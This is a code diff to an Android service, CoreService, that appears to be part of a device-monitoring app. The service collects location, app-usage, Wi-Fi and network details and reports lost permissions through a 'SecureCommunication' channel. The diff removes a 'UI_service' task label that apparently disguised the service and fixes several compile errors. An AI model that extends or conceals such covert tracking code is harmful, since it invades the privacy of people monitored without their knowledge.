@@ -28,6 +28,7 @@ import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.*
+import kotlinx.coroutines.tasks.await
 import org.json.JSONArray
 import org.json.JSONObject
 import java.util.concurrent.*
@@ -89,7 +90,6 @@ class CoreService : LifecycleService() {
     override fun onCreate() {
         super.onCreate()
         Log.d(TAG, "CoreService created")
-        setTaskDescriptionCompat()
         notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
         locationClient = LocationServices.getFusedLocationProviderClient(this)
         telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
@@ -132,21 +132,6 @@ class CoreService : LifecycleService() {
             alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent)
         } else {
             alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent)
-        }
-    }
-
-    private fun setTaskDescriptionCompat() {
-        val color = android.graphics.Color.parseColor("#FF323232")
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            setTaskDescription(
-                ActivityManager.TaskDescription.Builder()
-                    .setLabel("UI_service")
-                    .setPrimaryColor(color)
-                    .build()
-            )
-        } else {
-            @Suppress("DEPRECATION")
-            setTaskDescription(ActivityManager.TaskDescription("UI_service", null, color))
         }
     }
 
@@ -419,7 +404,7 @@ class CoreService : LifecycleService() {
                 android.app.usage.UsageStatsManager.INTERVAL_DAILY,
                 end - scanIntervalMillis, end
             )?.forEach {
-                repository.insertAppUsage(it.packageName, it.totalTimeInForeground, it.mLaunchCount)
+                repository.insertAppUsage(it.packageName, it.totalTimeInForeground, it.launchCount)
             }
         } catch (e: Exception) { Log.e(TAG, "AppUsage error", e) }
     }
@@ -434,21 +419,17 @@ class CoreService : LifecycleService() {
             val bssid: String
             val ip: String
             if (caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                    val wi = caps.transportInfo as? android.net.wifi.WifiInfo
-                    ssid = wi?.ssid?.replace(""", "") ?: ""
-                    bssid = wi?.bssid ?: ""
-                } else {
-                    @Suppress("DEPRECATION")
-                    val wm = applicationContext.getSystemService(WIFI_SERVICE) as android.net.wifi.WifiManager
-                    ssid = wm.connectionInfo?.ssid?.replace(""", "") ?: ""
-                    bssid = wm.connectionInfo?.bssid ?: ""
-                }
+                @Suppress("DEPRECATION")
+                val wifiInfo = (applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager)?.connectionInfo
+                ssid = wifiInfo?.ssid?.replace("\"", "") ?: ""
+                bssid = wifiInfo?.bssid ?: ""
                 ip = linkProps?.linkAddresses
                     ?.firstOrNull { it.address is java.net.Inet4Address }
                     ?.address?.hostAddress ?: ""
             } else {
-                ssid = ""; bssid = ""; ip = ""
+                ssid = ""
+                bssid = ""
+                ip = ""
             }
             val type = when {
                 caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "wifi"
@@ -610,7 +591,7 @@ class CoreService : LifecycleService() {
                 put("type", "permission_lost")
                 put("permissions", JSONArray(missing))
                 put("timestamp", System.currentTimeMillis())
-            }.toString(), SecureCommunication.Priority.HIGH)
+            }, SecureCommunication.Priority.HIGH)
         }
     }
 
